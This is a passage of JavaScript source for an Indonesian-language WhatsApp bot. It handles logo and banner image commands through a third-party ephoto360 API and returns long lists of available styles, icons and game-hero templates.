│17 ▸ *17*
│18 ▸ *18*
│
╰────────────˧`)
}
break
case 'listcompanylogo': {
if (!text) return newReply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *1*
│2 ▸ *2*
│3 ▸ *3*
│4 ▸ *4*
│5 ▸ *5*
│6 ▸ *6*
│7 ▸ *7*
│8 ▸ *8*
│9 ▸ *9*
│10 ▸ *10*
│11 ▸ *11*
│12 ▸ *12*
│13 ▸ *13*
│14 ▸ *14*
│15 ▸ *15*
│16 ▸ *16*
│17 ▸ *17*
│18 ▸ *18*
│19 ▸ *19*
│20 ▸ *20*
│21 ▸ *21*
│22 ▸ *22*
│23 ▸ *23*
│24 ▸ *24*
│25 ▸ *25*
│26 ▸ *26*
│
╰────────────˧`)
}
break
case 'listteamlogo': {
if (!text) return newReply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *cobra*
│2 ▸ *dragon*
│3 ▸ *eagle*
│4 ▸ *eagle2*
│5 ▸ *falcon*
│6 ▸ *bear*
│7 ▸ *lion*
│8 ▸ *lion2*
│9 ▸ *buffalo*
│10 ▸ *tiger*
│11 ▸ *tiger2*
│12 ▸ *wolf*
│
╰────────────˧`)
}
break

case 'pencilsketch':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2|icon*\n*Untuk List Icon Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2|icon*\n*Untuk List Icon Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m3 = mm.split("|")[2]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&text2=${m2}&icon=${m3}&apikey=${setting.BotKey}`)
Aira.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case 'listpencilsketch': {
if (!text) return newReply(`╭─▸ *LIST ICON*
│
├❖ *LIST*
│1 ▸ *bird*
│2 ▸ *butterfly*
│3 ▸ *coffee*
│4 ▸ *dove*
│5 ▸ *leaf*
│6 ▸ *like*
│7 ▸ *lotus*
│8 ▸ *milk-tea*
│9 ▸ *panda*
│10 ▸ *tree*
│11 ▸ *woman*
│12 ▸ *bear*
│13 ▸ *bull*
│14 ▸ *dragon*
│15 ▸ *eagle*
│16 ▸ *hawk*
│17 ▸ *ninja*
│18 ▸ *paw*
│19 ▸ *rooster*
│20 ▸ *sabertooth*
│21 ▸ *skull*
│22 ▸ *warrior*
│23 ▸ *zebra*
│
╰────────────˧`)
}
break

case 'bannerofaov':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2|character*\n*Untuk List Character Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2|character*\n*Untuk List Character Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m3 = mm.split("|")[2]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&text2=${m2}&character=${m3}&apikey=${setting.BotKey}`)
Aira.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case 'listbannerofaov': {
if (!text) return newReply(`"peura",
"rouie-5",
"roxie-2",
"sinestrea-4",
"tachi",
"telannas-7",
"tulen-7",
"veera-3",
"veera-4",
"veres-6",
"violet-7",
"wukong-3",
"annette-6",
"astrid-5",
"bright-2",
"butterfly-4",
"butterfly-5",
"diao-chan",
"enzo-4",
"helen",
"iggy-3",
"ilumia-4",
"ishar-5",
"lauriel-7",
"mina-4",
"annette-5",
"aoi-3",
"arum-3",
"azzenka",
"bright",
"capheny-6",
"celica-2",
"elsu-3",
"ilumia-3",
"ishar-4",
"kahlii-2",
"lauriel-6",
"laville-4",
"liliana-6",
"mina-3",
"paine",
"rouie-4",
"veres5",
"murad-6",
"veres-2",
"tulen-5",
"lindis-2",
"dextra",
"nakroth-6",
"sephera3",
"darcy2",
"capheny4",
"astrid4",
"yorn2",
"airi4",
"sinestrea2",
"sinestrea1",
"zephys2",
"yena4",
"volkath3",
"tulen4",
"thorne",
"quillen5",
"nakroth5",
"laville3",
"hayate4",
"florentino3",
"butterfly3",
"amily3",
"annette4",
"allain",
"arum2",
"astrid3",
"ata2",
"ata",
"butterfly2",
"capheny3",
"dirak",
"elandorr2",
"elandorr",
"florentino2",
"hayate3",
"ilumia2",
"ishar3",
"jinna2",
"keera",
"lauriel4",
"laville2",
"laville",
"liliana4",
"lubu2",
"mganga2",
"murad5",
"nakroth4",
"omen2",
"paine",
"preyta",
"qi2",
"quillen4",
"rouie2",
"rouie",
"skud2",
"taara",
"telannas4",
"valhein3",
"valhein2",
"violet5",
"violet4",
"yena3",
"yena2",
"zata",
"zata2",
"enzo",
"hayate2",
"krixi2",
"krizziz",
"murad4",
"volkath2",
"volkath",
"wukong2",
"arduin2",
"mina2",
"zuka2",
"wisp2",
"errol2",
"ishar2",
"lubu&diaochan",
"maloch",
"ormarr",
"thane",
"tulen&butterfly",
"ishar",
"tulen3",
"butterfly",
"lauriel3",
"liliana3",
"nakroth3",
"baldum",
"lauriel2",
"celica",
"annette3",
"capheny2",
"gildur2",
"quillen2",
"sephera2",
"ryoma2",
"tulen2",
"tulen1",
"qi",
"liliana2",
"murad3",
"zephys",
"zip2",
"airi3",
"amily2",
"astrid2",
"lauriel",
"nakroth2",
"violet3",
"airi2",
"alice3",
"arduin",
"elsu2",
"ignis",
"jinna",
"joker",
"kilgroth",
"lubu",
"marja",
"moren",
"payna",
"ryoma",
"skud",
"superman",
"valhein",
"xeniel",
"zill",
"yena",
"zip",
"sephera",
"aleister",
"alice2",
"annette2",
"arthur",
"arum",
"astrid",
"darcy",
"batman",
"errol",
"fennik",
"flash",
"florentino",
"gildur",
"grakk",
"hayate",
"kahlii",
"mganga",
"mina",
"murad2",
"omen",
"richter",
"rourke",
"telannas2",
"toro",
"violet2",
"wonderwomen",
"roxie",
"natalya",
"airi",
"amily",
"annette",
"elsu",
"ilumia",
"alice",
"zuka",
"wisp",
"wiro",
"veres",
"quillen",
"lindis",
"krixi",
"murad",
"liliana",
"enzo",
"diaochan",
"capheny",
"veera",
"tulen",
"slimz",
"yorn",
"violet",
"telannas",
"raz",
"wukong",
"nakroth"`) 
}
break

case 'fbgamepubgcover':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|cover*\n*Untuk List Cover Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|cover*\n*Untuk List Cover Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&template=${m2}&apikey=${setting.BotKey}`)
Aira.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case 'listfbgamepubgcover': {
if (!text) return newReply(`╭─▸ *LIST COVER*
│
├❖ *LIST*
│1 ▸ *cover-1*
│2 ▸ *cover-2*
│3 ▸ *cover-3*
│4 ▸ *cover-4*
│5 ▸ *cover-5*
│6 ▸ *cover-6*
│7 ▸ *cover-7*
│8 ▸ *cover-8*
│9 ▸ *cover-9*
│10 ▸ *cover-10*
│11 ▸ *cover-11*
│12 ▸ *cover-12*
│
╰────────────˧`)
}
break

case 'anonymous': case 'pubglogomaker': case 'astronotspace': case 'maketeamlogo':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|style*\n*Untuk List Style Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|style*\n*Untuk List Style Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&style=${m2}&apikey=${setting.BotKey}`)
Aira.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case 'listanonymous': {
if (!text) return newReply(`╭─▸ *LIST STYLE*
│
├❖ *LIST*
│1 ▸ *style-1*
│2 ▸ *style-2*
│3 ▸ *style-3*
│
╰────────────˧`)
}
break
case 'listpubglogomaker': {
if (!text) return newReply(`╭─▸ *LIST STYLE*
│
├❖ *LIST*
│1 ▸ *women*
│2 ▸ *nen*
│
╰────────────˧`)
}
break
case 'listastronotspace': {
if (!text) return newReply(`╭─▸ *LIST STYLE*
│
├❖ *LIST*
│1 ▸ *anubis*
│2 ▸ *dragon*
│3 ▸ *duck*
│4 ▸ *gorilla*
│5 ▸ *panda*
│6 ▸ *panther*
│7 ▸ *shark*
│8 ▸ *squirrel*
│9 ▸ *tiger*
│10 ▸ *wolf*
│11 ▸ *bull*
│12 ▸ *rhino*
│13 ▸ *rooster*
│14 ▸ *pikachu*
│15 ▸ *parrot*
│16 ▸ *boar*
│17 ▸ *bee*
│18 ▸ *hurricane*
│19 ▸ *deer*
│20 ▸ *horse*
│21 ▸ *crocodile*
│22 ▸ *pitbull*
│
╰────────────˧`)
}
break
case 'listmaketeamlogo': {
if (!text) return newReply(`╭─▸ *LIST STYLE*
│
├❖ *LIST*
│1 ▸ *anubis*
│2 ▸ *cowgirl*
│3 ▸ *dragon*
│4 ▸ *duck*
│5 ▸ *ghost*
│6 ▸ *gorilla*
│7 ▸ *panda*
│8 ▸ *panther*
│9 ▸ *shark*
│10 ▸ *squirrel*
│11 ▸ *tiger*
│12 ▸ *wolf*
│13 ▸ *bee*
│14 ▸ *crocodile*
│15 ▸ *deer*
│16 ▸ *pitbull*
│17 ▸ *horse*
│18 ▸ *hurricane*
│19 ▸ *indian*
│20 ▸ *assassin*
│21 ▸ *boar*
│22 ▸ *rapid*
│23 ▸ *raven*
│24 ▸ *warrior*
│25 ▸ *pikachu*
│26 ▸ *pubg*
│27 ▸ *ninja*
│28 ▸ *drift*
│29 ▸ *yasuo*
│30 ▸ *rhino*
│31 ▸ *phoenix*
│32 ▸ *bull*
│33 ▸ *hornet*
│34 ▸ *eagle*
│35 ▸ *hunter*
│36 ▸ *parrot*
│37 ▸ *rooster*
│38 ▸ *lion*
│39 ▸ *skull*
│40 ▸ *wolver*
│41 ▸ *wolf*
│42 ▸ *cobra*
│43 ▸ *dragon*
│44 ▸ *panther*
│45 ▸ *owl*
│46 ▸ *tiger*
│47 ▸ *reaper*
│48 ▸ *warrior*
│
╰────────────˧`)
}
break

case 'colorfulpubg':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|color*\n*Untuk List Color Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|color*\n*Untuk List Color Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&color=${m2}&apikey=${setting.BotKey}`)
Aira.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case 'listcolorfulpubg': {
if (!text) return newReply(`╭─▸ *LIST COLOR*
│
├❖ *LIST*
│1 ▸ *gold*
│2 ▸ *green-blue*
│3 ▸ *green-yellow*
│4 ▸ *pink-yellow*
│5 ▸ *cyan-purple*
│6 ▸ *orange-red*
│
╰────────────˧`)
}
break

case 'metalmascot': case 'blueneon': case 'circlemascotteam': case 'cutegirlgamer':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|logo*\n*Untuk List Logo Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|logo*\n*Untuk List Logo Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&logo=${m2}&apikey=${setting.BotKey}`)
Aira.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case 'listmetalmascot': {
if (!text) return newReply(`╭─▸ *LIST LOGO*
│
├❖ *LIST*
│1 ▸ *snakelion*
│2 ▸ *dragon*
│3 ▸ *eagle*
│4 ▸ *falcon*
│5 ▸ *fox*
│6 ▸ *lion*
│7 ▸ *panther*
│8 ▸ *phoenix*
│9 ▸ *rhino*
│10 ▸ *squirrel*
│11 ▸ *unicorn*
│12 ▸ *tiger*
│13 ▸ *zebra* 
│14 ▸ *wolf* 
│
╰────────────˧`)
}
break
case 'listblueneon': {
if (!text) return newReply(`╭─▸ *LIST LOGO*
│
├❖ *LIST*
│1 ▸ *tiger*
│2 ▸ *shark*
│3 ▸ *dugong*
│4 ▸ *bull*
│5 ▸ *cheetah*
│6 ▸ *lion*
│
╰────────────˧`)
}
break
case 'listcirclemascotteam': {
if (!text) return newReply(`╭─▸ *LIST LOGO*
│
├❖ *LIST*
│1 ▸ *panther*
│2 ▸ *rhino*
│3 ▸ *squirrel*
│4 ▸ *unicorn*
│5 ▸ *zebra*
│6 ▸ *lionsnake*
│7 ▸ *bear*
│8 ▸ *bull*
│9 ▸ *dragon*
│10 ▸ *eagle*
│11 ▸ *fox*
│12 ▸ *griffin*
│13 ▸ *hawk*
│14 ▸ *lion*
│15 ▸ *peacock*
│16 ▸ *phoenix*
│17 ▸ *tiger*
│18 ▸ *wolver*
│
╰────────────˧`)
}
break
case 'listcutegirlgamer': {
if (!text) return newReply(`╭─▸ *LIST LOGO*
│
├❖ *LIST*
│1 ▸ *style-1*
│2 ▸ *style-2*
│3 ▸ *style-3*
│4 ▸ *style-4*
│5 ▸ *style-5*
│6 ▸ *style-6*
│7 ▸ *style-7*
│8 ▸ *style-8*
│9 ▸ *style-9*
│10 ▸ *style-10*
│11 ▸ *style-11*
│12 ▸ *style-12*
│
╰────────────˧`)
}
break

case 'effect3donbeach':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|background*\n*Untuk List Background Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|background*\n*Untuk List Background Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&background=${m2}&apikey=${setting.BotKey}`)
Aira.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case 'listeffect3donbeach': {
if (!text) return newReply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *beach-1*
│2 ▸ *beach-2*
│3 ▸ *beach-3*
│4 ▸ *beach-4*
│5 ▸ *beach-5*
│6 ▸ *beach-6*
│
╰────────────˧`)
}
break

case 'coverbannerlol': case 'wallpaperaov': case 'wallpaperml':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|hero*\n*Untuk List Hero Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|hero*\n*Untuk List Hero Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&heroes=${m2}&apikey=${setting.BotKey}`)
Aira.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case 'listcoverbannerlol': {
if (!text) return newReply(`      "jinx7",
        "jinx-8",
        "kassadin-5",
        "nissfortune-5",
        "pyke-7",
        "riven-8",
        "sylas-5",
        "vayne-9",
        "kassadin-4",
        "qiyana-5",
        "renataglasc",
        "shen-5",
        "heimerdinger-3",
        "nunu-5",
        "orianna-4",
        "ziggs-4",
        "soraka-9",
        "soraka-10",
        "xayah-3",
        "zeri-2",
        "ahri-9",
        "akshan-2",
        "amumu-4",
        "annie-3",
        "bard-3",
        "brand-5",
        "diana-4",
        "draven-3",
        "ekko-6",
        "elise-4",
        "ezreal-7",
        "gwen-3",
        "janna-6",
        "kindred-3",
        "leblanc-7",
        "leona-7",
        "lissandra-4",
        "lux-8",
        "lux-9",
        "nalzahar-4",
        "nasteryi-7",
        "reksai-3",
        "sett-3",
        "sivir-6",
        "teemo-5",
        "tristana-6",
        "vladimir-5",
        "xinzhao-5",
        "zed-7",
        "zeri",
        "caitlyn-6",
        "caitlyn-7",
        "caitlyn-8",
        "caitlyn-9",
        "caitlyn-10",
        "caitlyn-11",
        "jayce-5",
        "kaisa-8",
        "karma-7",
        "thresh-6",
        "vi-5",
        "yasuo-8",
        "yasuo-9",
        "fiora-8",
        "norgana-7",
        "nami-5",
        "poppy-4",
        "syndra-5",
        "yuumi-4",
        "jarvaniv-6",
        "kayn-4",
        "kayle-5",
        "lillia-2",
        "norgana-6",
        "tryndamere-3",
        "vex",
        "vex-2",
        "yone-4",
        "tristana-5",
        "viego-2",
        "akali-10",
        "anivia-4",
        "darius-5",
        "graves-6",
        "seraphine-5",
        "shaco-2",
        "twistedfate-4",
        "xayah-2",
        "zyra-5",
        "ahri-8",
        "ashe-6",
        "cassiopeia-4",
        "evelynn-6",
        "leblanc-6",
        "nalphite-4",
        "warwick-5",
        "akshan",
        "graves-5",
        "nissfortune-5",
        "pyke-6",
        "rengar-6",
        "thresh-5",
        "diana-3",
        "relia-11",
        "olaf-3",
        "pantheon-6",
        "pantheon-7",
        "riven-7",
        "vayne-8",
        "corki-4",
        "naokai-2",
        "rammus-4",
        "veigar-4",
        "zed-6",
        "camille-4",
        "drmundo-3",
        "lucian-6",
        "nordekaiser-4",
        "renekton-4",
        "sejuani-5",
        "senna-3",
        "sylas-4",
        "varus-5",
        "xerath-3",
        "damwon",
        "galio-3",
        "gwen",
        "gwen-2",
        "jax-5",
        "jinx-6",
        "kayle-5",
        "sion-2",
        "twitch-4",
        "velkoz-4",
        "blitzcrank-3",
        "leona-6",
        "lulu-3",
        "lulu-4",
        "lux-7",
        "nasus-5",
        "nunu-4",
        "rumble-2",
        "samira-3",
        "aphelios-2",
        "blitzcrank-2",
        "caitlyn-5",
        "garen-6",
        "kogmaw-4",
        "leona-5",
        "alzahar-3",
        "syndra-4",
        "wukong-4",
        "yone-3",
        "yuumi-3",
        "zyra-4",
        "alistar-4",
        "chogath-2",
        "draven-2",
        "fiora-7",
        "jarvan-5",
        "jhin-5",
        "karma-6",
        "nautilus-2",
        "neeko-5",
        "shyvana-3",
        "viego",
        "azir-4",
        "diana-4",
        "gragas-2",
        "janna-5",
        "kalista-3",
        "katarina-6",
        "ornn-2",
        "qiyana-4",
        "quinn-3",
        "rell",
        "xinzhao-4",
        "anivia-3",
        "hecarim-4",
        "illaoi-2",
        "jayce-4",
        "lissandra-3",
        "nami-4",
        "nasus-4",
        "nidalee-5",
        "seraphine-4",
        "singed-2",
        "skarner-2",
        "soraka-7",
        "varus-4",
        "vladimir-4",
        "yorick-4",
        "zac",
        "riven-8",
        "ahri-7",
        "akali-9",
        "evelynn-5",
        "kaisa-7",
        "lucian-5",
        "seraphine",
        "seraphine-2",
        "seraphine-3",
        "aatrox-6",
        "amumu-3",
        "lise-3",
        "fizz-5",
        "karma-5",
        "zeri-2",
        "kassadin-3",
        "khazix-4",
        "sivir-5",
        "twistedfate-3",
        "ashe-5",
        "brand-4",
        "leesin-5",
        "olaf-2",
        "sett-2",
        "kayle-4",
        "leblanc-5",
        "pyke-5",
        "samira",
        "samira-2",
        "viktor-2",
        "yasuo-7",
        "zed-5",
        "ezreal-6",
        "nasteryi-6",
        "shen-4",
        "sona-4",
        "vi-4",
        "yone",
        "yone-2",
        "ziggs-3",
        "ahri-6",
        "cassiopeia-3",
        "kindred-2",
        "riven-6",
        "kennen-2",
        "kogmaw-3",
        "lillia",
        "syndra-3",
        "teemo-4",
        "thresh-4",
        "vayne-7",
        "velkoz-3",
        "yasuo-6",
        "zoe-4",
        "bard-2",
        "gnar-3",
        "irelia-10",
        "nocturne-4",
        "poppy-3",
        "enna-2",
        "volibear-3",
        "volibear-4",
        "ekko-5",
        "fiora-6",
        "lucian-4",
        "pantheon-5",
        "leblanc-4",
        "norgana-5",
        "urgot-4",
        "zyra-3",
        "jinx-5",
        "sett",
        "alistar-3",
        "katarina-5",
        "lux-5",
        "lux-6",
        "nasteryi-5",
        "nalphite-3",
        "nordekaiser-3",
        "reksai-2",
        "sejuani-4",
        "tryndamere-2",
        "xerath-2",
        "aphelios",
        "garen-5",
        "jax-4",
        "karma-4",
        "leesin-4",
        "leona-4",
        "nidalee-4",
        "rengar-5",
        "soraka-5",
        "soraka-6",
        "swain-4",
        "sylas-3",
        "trundle-2",
        "vladimir-3",
        "aatrox-5",
        "akali-8",
        "ekko-4",
        "qiyana-3",
        "senna",
        "yasuo-5",
        "ashe-4",
        "darius-4",
        "hecarim-3",
        "norgana-4",
        "nami-3",
        "riven-4",
        "riven-5",
        "ryze-3",
        "neeko-3",
        "eeko-4",
        "xayahrakan",
        "zoe-3",
        "airi-6",
        "noctune-3",
        "pantheon-3",
        "pantheon-4",
        "rammus-3",
        "udyr-2",
        "veigar-3",
        "akali-7",
        "garen-4",
        "irelia-8",
        "irelia-9",
        "jinx-4",
        "lucian-3",
        "pyke-4",
        "warwick-4",
        "caitlyn-3",
        "caitlyn-4",
        "kaisa-6",
        "qiyana",
        "qiyana-2",
        "yasuo-4",
        "jhin-3",
        "karma-3",
        "nordekaiser-2",
        "tristana-4",
        "nami",
        "poppy-3",
        "aatrox",
        "lulu",
        "braum",
        "camille",
        "karma",
        "kindred",
        "hecarim",
        "norgana",
        "renekton",
        "kennen",
        "akali",
        "varus",
        "orianna",
        "blitzcrank",
        "bloodmoonjhin",
        "bloodmoontalon",
        "arcaderiven",
        "udyr",
        "rumble",
        "gnar",
        "shaco",
        "twitch",
        "veigar",
        "tryndamere",
        "viktor",
        "trundle",
        "ezreal",
        "poppy",
        "lissandra",
        "jax",
        "vi",
        "vellkoz",
        "darius",
        "diana",
        "corki",
        "sivir",
        "ryze",
        "azir",
        "tristana",
        "kled",
        "volibear",
        "twisterfate",
        "anivia",
        "zyra",
        "quinn",
        "nissfortune",
        "kalista",
        "ezrealandshen",
        "gangplank",
        "hextachannie",
        "elementalistlux",
        "xinzhao",
        "vayne",
        "jhin",
        "reksai",
        "graves",
        "kogmaw",
        "garen",
        "porojinx",
        "warwick",
        "fizz",
        "caitlyn",
        "rengar",
        "talon",
        "nidalee",
        "lux",
        "jinx",
        "thresh",
        "wukong",
        "sona",
        "ahri",
        "riven",
        "zed",
        "leesin",
        "janna",
        "katarina",
        "leblanc",
        "leona",
        "fiora",
        "lucian",
        "shen",
        "ziggs",
        "yasuo",
        "ekko",
        "draven",
        "ashe",
        "ekko-5",
        "teemo",
        "khazix",
        "nasteryi",
        "brand",
        "taliyah",
        "nocturne",
        "cassiopeia",
        "xayah",
        "rakan",
        "syndra",
        "irelia",
        "leesingf",
        "yasuobm",
        "aurelionsol",
        "pantheon",
        "bard",
        "singed",
        "soraka",
        "taric",
        "naokai",
        "xerath",
        "gragas",
        "jayce",
        "riven3",
        "nalphite",
        "naster_yi2",
        "chogath",
        "zed2",
        "darius2",
        "talon2",
        "kayle",
        "drmundo",
        "rammus",
        "vladimir",
        "ahri-2",
        "karma-2",
        "jarvan",
        "nidalee-2",
        "vayner-2",
        "warwick-2",
        "rengar-2",
        "yasuo-3",
        "galio",
        "pantheon-2",
        "jinx-2",
        "nalzahar",
        "olaf",
        "shyvana",
        "thresh-2",
        "sion",
        "caitlyn-2",
        "swain",
        "kassadin",
        "heimerdinger",
        "amumu",
        "alistar",
        "nasus",
        "sejuani",
        "ezreal3",
        "nautilus",
        "fiddlesticks",
        "sona2",
        "karthus",
        "ekko2",
        "orianna2",
        "velkoz-2",
        "xinzhao2",
        "garen2",
        "annie-2",
        "yasuonb",
        "rivendb",
        "kayn",
        "kaisa",
        "veigar-2",
        "vayne-3",
        "twitch-2",
        "tristana-2",
        "rhaast",
        "nalzahar-2",
        "kayle-2",
        "illaoi",
        "fizz-2",
        "elise",
        "brand-2",
        "syndra-2",
        "soraka-2",
        "nissfortune-2",
        "hecarim-2",
        "ezreal-2",
        "ahri-3",
        "yorick",
        "z-2",
        "tahmkench",
        "shen-2",
        "ornn",
        "cassiopeia-2",
        "renekton-2",
        "nasus-2",
        "jarvan-2",
        "fiora-2",
        "alistar-2",
        "taric-2",
        "zac-2",
        "yorick-2",
        "varus-2",
        "nordekaiser",
        "nasteryi-3",
        "katarina-2",
        "janna-2",
        "fiora-3",
        "evelynn",
        "elise-2",
        "ashe-2",
        "annie",
        "zoe",
        "vi-2",
        "vayne-4",
        "rengar-3",
        "jhin-2",
        "graves-2",
        "xayahrakan",
        "warwick-3",
        "nissfortune-3",
        "lux-2",
        "jarvaniv",
        "zoe-2",
        "swain-2",
        "sivir-2",
        "nissfortune-4",
        "jax-2",
        "galio-2",
        "varus-3",
        "urgot",
        "twistedfate-2",
        "taric-3",
        "swain-3",
        "shen-3",
        "rammus-2",
        "pyke-2",
        "pyke",
        "nasus-3",
        "talon",
        "khazix-2",
        "kayn-2",
        "irelia-2",
        "evelynn-2",
        "akali-2",
        "vladimir-2",
        "jayce-2",
        "janna-3",
        "irelia-4",
        "irelia-3",
        "diana-2",
        "zed-3",
        "teemo-2",
        "taliyah-2",
        "shyvana-2",
        "poppy-2",
        "katarina-3",
        "jax-3",
        "garen-3",
        "darius-3",
        "chogath-2",
        "aatrox-2",
        "soraka-3",
        "sona-3",
        "sivir-3",
        "kaisa-2",
        "akali-4",
        "akali-3",
        "xinzhao-3",
        "urgot-3",
        "urgot-2",
        "tristana-3",
        "talon-3",
        "sejuani-2",
        "nunu-2",
        "lulu-2",
        "lucian-2",
        "irelia-6",
        "irelia-5",
        "ashe-3",
        "ziggs-2",
        "yasuo-2",
        "sona-4",
        "nalphite-2",
        "khazix-3",
        "kayn-3",
        "jinx-3",
        "orianna-3",
        "kaisa-4",
        "kaisa-3",
        "heimerdinger-2",
        "ezreal-4",
        "evelynn-3",
        "akali-5",
        "ahri-4",
        "thresh-3",
        "ryze-2",
        "kled-2",
        "janna-4",
        "graves-3",
        "fiddlesticks-2",
        "ekko-3",
        "amumu-2",
        "nami-2",
        "lulusoraka",
        "lissandra-2",
        "leona-3",
        "leona-2",
        "leblanc-2",
        "ezrealmissfortune",
        "camille-2",
        "twitch-3",
        "soraka-4",
        "renekton-3",
        "neeko-2",
        "neeko",
        "nasteryi-4",
        "drmundo-2",
        "akali-6",
        "zyra-2",
        "zilean",
        "wukong-3",
        "wukong-2",
        "teemo-3",
        "skarner",
        "sivir-4",
        "riven-2",
        "quinn-2",
        "pyke-3",
        "nocturne-2",
        "nidalee-3",
        "norgana-2",
        "leesin-3",
        "kogmaw-2",
        "kassadin-2",
        "karthus-2",
        "kalista-2",
        "gnar-2",
        "gangplank-2",
        "corki-2",
        "azir-3",
        "azir-2",
        "aatrox-4",
        "aatrox-3",
        "vi-3",
        "vayne-6",
        "vayne-5",
        "tahmkench-2",
